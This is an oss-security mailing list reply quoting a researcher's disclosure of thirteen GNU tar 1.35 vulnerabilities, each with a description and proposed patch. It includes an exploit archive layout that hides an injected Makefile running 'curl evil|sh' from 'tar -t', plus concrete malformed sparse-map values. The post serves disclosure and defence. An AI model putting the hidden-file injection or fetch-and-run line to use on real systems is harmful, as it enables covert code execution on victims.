Received: (qmail 32765 invoked by uid 550); 12 Apr 2026 03:02:33 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 32008 invoked from network); 12 Apr 2026 03:02:11 -0000
Date: Sun, 12 Apr 2026 05:02:03 +0200
From: Solar Designer <solar@openwall.com>
To: oss-security@lists.openwall.com
Cc: Vahagn Vardanian <vahagn@redrays.io>, Paul Eggert <eggert@cs.ucla.edu>
Message-ID: <20260412030203.GA27554@openwall.com>
References: <e9445380-c50f-4385-93fb-02fbeec634af@oracle.com>
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <e9445380-c50f-4385-93fb-02fbeec634af@oracle.com>
User-Agent: Mutt/1.4.2.3i
Subject: Re: [oss-security] GNU tar: listing/extraction desynchronization allows hidden file injection

On Sat, Apr 11, 2026 at 10:10:20AM -0700, Alan Coopersmith wrote:
> https://lists.gnu.org/archive/html/bug-tar/2026-03/msg00007.html disclosed:
> >From: 	 Guillermo de Angel
> >Subject: GNU tar: listing/extraction desynchronization allows hidden file 
> >injection (tar -t vs tar -x)
> >Date: 	 Wed, 18 Mar 2026 15:55:41 +0100

> Red Hat appears to have assigned CVE-2026-5704 to this issue.
> 
> Paul Eggert provided a patch in
> https://lists.gnu.org/archive/html/bug-tar/2026-03/msg00011.html
> which is also available in
> https://cgit.git.savannah.gnu.org/cgit/tar.git/commit/?id=b8d8a61b25588caca4efaf9bdd2e3f1a49da77e3
> 
> https://lists.gnu.org/archive/html/bug-tar/2026-03/msg00012.html points out
> that a similar report was also included in
> https://lists.gnu.org/archive/html/bug-tar/2026-02/msg00022.html
> along with a number of other bug reports.

This last posting indeed includes "a number of other bug reports", and
seems to have no replies.  Confusingly, it seems to have been posted as
a reply to an unrelated message, but that's no reason to ignore it.
I'll quote it below.  First the summary part:

>   #   Severity  File          Function / Line              Short description
>   --  --------  -----------   ---------------------------  --------------------------
>   01  CRITICAL  sparse.c:593  sparse_extract_file          Archive stream desync -> file injection
>   14  CRITICAL  (same root cause as #01)                   Full RCE chain demo
>   02  HIGH      sparse.c:803  oldgnu_add_sparse            Overlapping sparse regions -> corruption
>   03  HIGH      xheader.c     sparse_numbytes/map_decoder  Missing INT_ADD_OVERFLOW
>   04  LOW       extract.c:1444 create_placeholder_file     FLEXNSIZEOF size_t overflow
>   05  MEDIUM    extract.c:566 delay_set_stat               Memory leak on reuse path
>   06  MEDIUM    extract.c:996 apply_nonancestor_delayed..  Shallow xattr_map copy (UAF)
>   07  MEDIUM    extract.c:985 apply_nonancestor_delayed..  Uninitialized tar_stat_info
>   08  MEDIUM    extract.c:1898 apply_delayed_link          Uninitialized tar_stat_info
>   09  MEDIUM    list.c:565    read_header / decode_header  strcmp past magic field
>   10  MEDIUM    extract.c:1478 create_placeholder_file     Incomplete hash destructor
>   11  LOW       extract.c:364 check_time                   Signed overflow in time diff
>   12  LOW       extract.c:953 apply_nonancestor_delayed..  file_name_len=0 underflow
>   13  LOW       xheader.c:630 decode_record                ptrdiff_t -> int truncation

There's some discrepancy in vulnerability count - the summary lists 14
and says one has "same root cause" as another, so that's 13 unique, and
the rest of the message lists them, but the Subject line says 12.  Also
the message says:

> I am attaching proposed patches and PoC archives for everything below.

but I see no attachments.

Anyway, here's the full thing:

> From: 	Vahagn Vardanian
> Subject: 	[SECURITY] 12 vulnerabilities in tar 1.35 extraction path, including arbitrary file injection
> Date: 	Tue, 24 Feb 2026 14:46:53 +0400
> 
> Hi,
> 
> I found several security bugs in GNU tar 1.35 during a code audit
> focused on the extraction path.  The most severe one allows a crafted
> archive to inject arbitrary files onto disk -- files that never appear
> in "tar -t" output.  A full RCE chain (injecting a Makefile) is
> trivial to build on top of it.
> 
> I am attaching proposed patches and PoC archives for everything below.
> I would be happy to work with you on getting these merged.  I also
> prepared Debian quilt patches and regression tests (nine .at files for
> the GNU Autotest framework) that cover all of the bugs.
> 
> The bugs are listed below from most to least severe.
> 
> 
> === BUG #01 / #14  (CRITICAL) ===
>     Arbitrary file injection via PAX v0.1 sparse archive stream desync
> 
> Files:   src/sparse.c:576-596, src/xheader.c
> Impact:  An attacker can inject files with arbitrary names, modes, and
>          content that are invisible to "tar -t".  Full RCE is
>          demonstrated by injecting a Makefile into what looks like a
>          legitimate source tarball.
> 
> Description:
> 
> sparse_extract_file() (sparse.c:576) reads archive data blocks
> according to the sparse map, not according to archive_file_size.
> If an attacker sets archive_file_size smaller than the sum of all
> sparse_map[i].numbytes, the extractor reads past the end of the
> declared archive data into the headers and data of subsequent
> archive members.  This desynchronizes the archive stream: the
> next call to read_header() interprets raw data as a tar header.
> 
> The attacker controls that data, so they can inject a fully
> functional tar header for any file they want.  The injected file
> never appears in "tar -t" output because listing mode does not
> trigger sparse extraction.
> 
> Concrete exploit scenario:
> 
>   [PAX ext hdr: GNU.sparse.map=0,512,2048,512; sparse.size=4096]
>   [ustar hdr: .cache, size=512]        <- archive_file_size=512
>   [512 bytes of .cache data]           <- region 0 ok
>   [ustar hdr: .gitignore, size=0]      <- consumed as region 1 data!
>   [ustar hdr: Makefile, size=80, mode=0755]  <- injected member
>   [80 bytes: "all:\n\t@curl evil|sh\n"]
>   [end-of-archive]
> 
>   $ tar -tf rce_chain.tar
>   project-1.0/
>   project-1.0/README.md
>   project-1.0/src/main.c
>   project-1.0/Makefile          <- looks legitimate
>   $ tar -xf rce_chain.tar -C /tmp/build && make -C /tmp/build/project-1.0
>   [*] RCE achieved
> 
> Proposed fix:
> 
> After tar_sparse_decode_header() returns (sparse.c:593), sum all
> sparse_map[i].numbytes and call FATAL_ERROR if the total exceeds
> archive_file_size.  FATAL_ERROR (not ERROR) is required because the
> caller in extract.c ignores the return value and calls skim_file()
> with an uninitialized size variable otherwise.
> 
>   if (rc)
>     {
>       off_t total = 0;
>       for (i = 0; i < file.stat_info->sparse_map_avail; i++)
>         {
>           if (INT_ADD_OVERFLOW (total, file.stat_info->sparse_map[i].numbytes))
>             FATAL_ERROR ((0, 0, _("%s: sparse map total exceeds archive file size"),
>                          st->orig_file_name));
>           total += file.stat_info->sparse_map[i].numbytes;
>         }
>       if (total > file.stat_info->archive_file_size)
>         FATAL_ERROR ((0, 0, _("%s: sparse map total exceeds archive file size"),
>                      st->orig_file_name));
>     }
> 
> 
> === BUG #02  (HIGH) ===
>     Overlapping OLDGNU sparse map entries cause silent data corruption
> 
> File:    src/sparse.c:789-803  (oldgnu_add_sparse)
> Impact:  Silent file corruption.  The extractor lseeks backward and
>          overwrites already-written data with content from a later
>          sparse region.
> 
> Description:
> 
> oldgnu_add_sparse() validates that individual offset and numbytes
> values are non-negative and that offset+numbytes does not overflow,
> but it never checks that the new entry does not overlap with the
> previous one.  An attacker can supply:
> 
>   sp[0]: offset=0,   numbytes=512
>   sp[1]: offset=256, numbytes=512
> 
> Region 1 overlaps region 0 at bytes 256-511.  The extractor lseeks
> to offset 256 and overwrites the first 256 bytes written by region 0.
> 
> Proposed fix:
> 
> Track the end of the previous entry and reject any new entry whose
> offset falls below it:
> 
>   if (file->stat_info->sparse_map_avail > 0)
>     {
>       struct sp_array *prev =
>         &file->stat_info->sparse_map[file->stat_info->sparse_map_avail - 1];
>       if (INT_ADD_OVERFLOW (prev->offset, prev->numbytes)
>           || sp.offset < prev->offset + prev->numbytes)
>         return add_fail;
>     }
> 
> The same check is also needed in the PAX v0.0 and v0.1 decoders in
> xheader.c (sparse_numbytes_decoder at line 1426 and sparse_map_decoder
> at line 1480).
> 
> 
> === BUG #03  (HIGH) ===
>     Signed integer overflow in PAX v0.0/v0.1 sparse offset+numbytes
> 
> Files:   src/xheader.c:1426 (sparse_numbytes_decoder)
>          src/xheader.c:1480 (sparse_map_decoder)
> Impact:  Signed 64-bit integer overflow in offset+numbytes arithmetic.
>          Undefined behavior that can corrupt internal state.
> 
> Description:
> 
> The PAX v1.0 decoder in sparse.c already checks:
> 
>   if (INT_ADD_OVERFLOW (sp.offset, u))
>     ...
> 
> But the PAX v0.0 and v0.1 decoders in xheader.c do not.  A crafted
> extended header with offset=9223372036854775800 and numbytes=100
> passes individual range checks but overflows signed off_t when summed.
> 
> UBSan output:
> 
>   xheader.c:1473: runtime error: signed integer overflow:
>     9223372036854775800 + 100 cannot be represented in type 'long int'
> 
> Proposed fix:
> 
> Add the same INT_ADD_OVERFLOW check after assigning numbytes in both
> sparse_numbytes_decoder() and sparse_map_decoder(), and return early
> with an error if the check fires.
> 
> 
> === BUG #04  (LOW) ===
>     FLEXNSIZEOF overflow in create_placeholder_file
> 
> File:    src/extract.c:1444
> Impact:  Theoretical heap buffer overflow if link_name is near SIZE_MAX.
> 
> Description:
> 
> create_placeholder_file() computes:
> 
>   xmalloc (FLEXNSIZEOF (struct delayed_link, target,
>                          strlen (current_stat_info.link_name) + 1));
> 
> If strlen(link_name) is near SIZE_MAX, adding 1 overflows size_t, and
> FLEXNSIZEOF computes a small allocation size.  The subsequent strcpy
> writes past the buffer.  PAX extended headers allow arbitrarily long
> linkpath values, so the attacker controls the length.  In practice
> this requires the system to have nearly SIZE_MAX bytes of memory
> available, so it is mostly theoretical.
> 
> Proposed fix:
> 
>   size_t link_len = strlen (current_stat_info.link_name);
>   if (SIZE_MAX - sizeof (struct delayed_link) <= link_len)
>     xalloc_die ();
> 
> 
> === BUG #05  (MEDIUM) ===
>     Memory leaks in delay_set_stat reuse path
> 
> File:    src/extract.c:566-590  (delay_set_stat)
> Impact:  Unbounded memory leak; a crafted archive with repeated
>          directory entries and different xattrs can cause OOM.
> 
> Description:
> 
> When the same directory appears multiple times in an archive,
> delay_set_stat() reuses the existing hash entry.  But it overwrites
> cntx_name (line 566), acls_a_ptr (line 571), acls_d_ptr (line 581),
> and xattr_map (line 590) without freeing the old values first.
> 
> Additionally, for NEW entries (the else branch at line 537), cntx_name,
> acls_a_ptr, and acls_d_ptr are not initialized to NULL.  The memory is
> allocated with xmalloc, so these fields contain garbage.  If the
> reuse path then calls free() on them, it frees garbage pointers.
> 
> Proposed fix:
> 
> On the reuse path, add free(data->cntx_name), free(data->acls_a_ptr),
> free(data->acls_d_ptr), and xattr_map_free()+xattr_map_init() before
> overwriting.  On the new-entry path, initialize the three pointer
> fields to NULL and the two length fields to 0.
> 
> 
> === BUG #06  (MEDIUM) ===
>     Shallow xattr_map copy -- dangling pointer / latent use-after-free
> 
> File:    src/extract.c:996  (apply_nonancestor_delayed_set_stat)
> Impact:  Dangling pointer after the source is freed.  Latent UAF
>          depending on how set_stat uses the xattr_map.
> 
> Description:
> 
>   struct tar_stat_info sb;
>   ...
>   sb.xattr_map = data->xattr_map;   // line 996: shallow copy
>   set_stat (data->file_name, &sb, ...);
>   // data is freed shortly after, invalidating xattr_map.xattrs
> 
> The struct assignment copies the pointer, not the data.  After
> set_stat returns and data is freed, sb.xattr_map.xattrs is dangling.
> 
> Proposed fix:
> 
> Replace the shallow copy with a deep copy:
> 
>   xattr_map_init (&sb.xattr_map);
>   xattr_map_copy (&sb.xattr_map, &data->xattr_map);
>   set_stat (...);
>   xattr_map_free (&sb.xattr_map);
> 
> 
> === BUG #07  (MEDIUM) ===
>     Uninitialized struct tar_stat_info on stack
> 
> File:    src/extract.c:985  (apply_nonancestor_delayed_set_stat)
> Impact:  Use of uninitialized memory; detected by MSan.
> 
> Description:
> 
>   struct tar_stat_info sb;       // line 985: uninitialized
>   sb.stat.st_mode = data->mode;  // only a few fields are set
>   ...
>   set_stat (data->file_name, &sb, ...);
> 
> Fields like stat.st_size, stat.st_dev, dumpdir, sparse_map, etc.
> retain garbage values from the stack.
> 
> MSan output:
> 
>   WARNING: MemorySanitizer: use-of-uninitialized-value
>     #0 in set_stat (extract.c:990)
>     #1 in apply_nonancestor_delayed_set_stat (extract.c:999)
> 
> Proposed fix:
> 
>   memset (&sb, 0, sizeof sb);
> 
> 
> === BUG #08  (MEDIUM) ===
>     Uninitialized struct tar_stat_info in apply_delayed_link
> 
> File:    src/extract.c:1898  (apply_delayed_link)
> Impact:  Same as Bug #07 -- use of uninitialized memory.
> 
> Description:
> 
>   struct tar_stat_info st1;       // line 1898: uninitialized
>   st1.stat.st_mode = ds->mode;
>   ...
>   set_stat (source, &st1, ...);
> 
> Same pattern as Bug #07 in a different function.
> 
> Proposed fix:
> 
>   memset (&st1, 0, sizeof st1);
> 
> 
> === BUG #09  (MEDIUM) ===
>     strcmp overread past the non-NUL-terminated magic field
> 
> File:    src/list.c:565, 632  (read_header, decode_header)
> Impact:  Buffer overread past the 6-byte magic field boundary.
>          Format misdetection with crafted headers.
> 
> Description:
> 
>   strcmp (h->magic, TMAGIC)                    // line 565
>   strcmp (header->header.magic, TMAGIC)        // line 632
> 
> TMAGIC is "ustar\0" (6 bytes including NUL).  The magic field in the
> header struct is exactly 6 bytes (char magic[6]).  If the field
> contains "ustar\x01" (no NUL terminator), strcmp reads past byte 5
> into the adjacent version[2] and uname[32] fields until it finds a NUL.
> 
> ASan (with tight heap allocator) reports:
> 
>   ERROR: AddressSanitizer: heap-buffer-overflow
>     READ of size 1 ... in __strcmp_sse42
> 
> Proposed fix:
> 
>   memcmp (h->magic, TMAGIC, sizeof TMAGIC)
> 
> 
> === BUG #10  (MEDIUM) ===
>     Incomplete destructor for delayed_link_table hash entries
> 
> File:    src/extract.c:1478  (create_placeholder_file)
> Impact:  Memory leak on hash collision/replacement.
> 
> Description:
> 
>   hash_initialize (0, 0, dl_hash, dl_compare, free)
> 
> The destructor callback is just free(), which frees the top-level
> struct delayed_link but not its sub-allocations: the sources linked
> list, cntx_name, acls_a_ptr, acls_d_ptr, and xattr_map.  When a hash
> collision causes an old entry to be evicted, these are leaked.
> 
> Proposed fix:
> 
> Write a proper destructor:
> 
>   static void
>   free_delayed_link (void *entry)
>   {
>     struct delayed_link *p = entry;
>     struct string_list *s, *next;
>     for (s = p->sources; s; s = next)
>       {
>         next = s->next;
>         free (s);
>       }
>     free (p->cntx_name);
>     free (p->acls_a_ptr);
>     free (p->acls_d_ptr);
>     xattr_map_free (&p->xattr_map);
>     free (p);
>   }
> 
> And pass free_delayed_link instead of free to hash_initialize.
> 
> 
> === BUG #11  (LOW) ===
>     Signed integer overflow in check_time
> 
> File:    src/extract.c:364  (check_time)
> Impact:  Undefined behavior (signed overflow) with base-256 encoded
>          mtime values near INT64_MAX.
> 
> Description:
> 
>   diff.tv_sec = t.tv_sec - now.tv_sec;    // line 364
> 
> If t.tv_sec is a very large positive value (e.g. 2^62 - 1, encoded
> in base-256 in the mtime field) and now.tv_sec is the current time,
> the subtraction overflows signed time_t.
> 
> UBSan output:
> 
>   extract.c:367: runtime error: signed integer overflow:
>     4611686018427387903 - 1708000000 cannot be represented in type 'long int'
> 
> Proposed fix:
> 
>   if (INT_SUBTRACT_OVERFLOW (t.tv_sec, now.tv_sec))
>     diff.tv_sec = TYPE_MAXIMUM (time_t);
>   else
>     diff.tv_sec = t.tv_sec - now.tv_sec;
> 
> 
> === BUG #12  (LOW) ===
>     Off-by-one when file_name_len is 0
> 
> File:    src/extract.c:953  (apply_nonancestor_delayed_set_stat)
> Impact:  Read at index -1 when data->file_name_len is 0.
> 
> Description:
> 
>   || (data->file_name_len < file_name_len
>       && file_name[data->file_name_len]
>       && (ISSLASH (file_name[data->file_name_len])
>           || ISSLASH (file_name[data->file_name_len - 1]))
> 
> If data->file_name_len is 0, the _expression_
> file_name[data->file_name_len - 1] accesses file_name[(size_t)-1].
> 
> Proposed fix:
> 
> Add a guard: data->file_name_len > 0 && data->file_name_len < ...
> 
> 
> === BUG #13  (LOW) ===
>     Integer truncation in decode_record
> 
> File:    src/xheader.c:630  (decode_record)
> Impact:  Implicit narrowing from ptrdiff_t to int; UBSan
>          -fsanitize=implicit-conversion fires.
> 
> Description:
> 
>   int len_len = len_lim - p;    // line 630
> 
> len_lim - p is ptrdiff_t.  If the difference exceeds INT_MAX, the
> implicit conversion to int wraps to a negative value.  The value is
> only used to format an error message, so the practical impact is
> limited to a garbled diagnostic, but UBSan rightfully flags it.
> 
> Proposed fix:
> 
>   int len_len = (int) (len_lim - p < 1000 ? len_lim - p : 1000);
> 
> This clamps the value to a reasonable range for the error message.
> 
> 
> === SUMMARY TABLE ===
> 
>   #   Severity  File          Function / Line              Short description
>   --  --------  -----------   ---------------------------  --------------------------
>   01  CRITICAL  sparse.c:593  sparse_extract_file          Archive stream desync -> file injection
>   14  CRITICAL  (same root cause as #01)                   Full RCE chain demo
>   02  HIGH      sparse.c:803  oldgnu_add_sparse            Overlapping sparse regions -> corruption
>   03  HIGH      xheader.c     sparse_numbytes/map_decoder  Missing INT_ADD_OVERFLOW
>   04  LOW       extract.c:1444 create_placeholder_file     FLEXNSIZEOF size_t overflow
>   05  MEDIUM    extract.c:566 delay_set_stat               Memory leak on reuse path
>   06  MEDIUM    extract.c:996 apply_nonancestor_delayed..  Shallow xattr_map copy (UAF)
>   07  MEDIUM    extract.c:985 apply_nonancestor_delayed..  Uninitialized tar_stat_info
>   08  MEDIUM    extract.c:1898 apply_delayed_link          Uninitialized tar_stat_info
>   09  MEDIUM    list.c:565    read_header / decode_header  strcmp past magic field
>   10  MEDIUM    extract.c:1478 create_placeholder_file     Incomplete hash destructor
>   11  LOW       extract.c:364 check_time                   Signed overflow in time diff
>   12  LOW       extract.c:953 apply_nonancestor_delayed..  file_name_len=0 underflow
>   13  LOW       xheader.c:630 decode_record                ptrdiff_t -> int truncation
> 
> 
> === REPRODUCTION ===
> 
> All bugs were confirmed on tar 1.35 (commit 8e3c8fa17 from
> https://git.savannah.gnu.org/cgit/tar.git).  Bugs #01, #02, and #14
> are reproducible without sanitizers on any 64-bit Linux system.  The
> remaining bugs require ASan, UBSan, or MSan to observe.
> 
> Build with sanitizers:
> 
>   # ASan + UBSan
>   CC=gcc CFLAGS="-g -O0 -fsanitize=address,undefined" \
>     LDFLAGS="-fsanitize=address,undefined" ./configure && make
> 
>   # MSan (requires clang)
>   CC=clang CFLAGS="-g -O0 -fsanitize=memory -fsanitize-memory-track-origins=2" \
>     LDFLAGS="-fsanitize=memory" ./configure && make
> 
> I can provide the PoC generator scripts and the complete patch if that
> would be helpful.
> 
> Best regards,
> Vahagn Vardanyan
> 
> -- 
> Vahagn Vardanian
> Co-founder and Chief Technology Officer,
> RedRays, Inc

Alexander
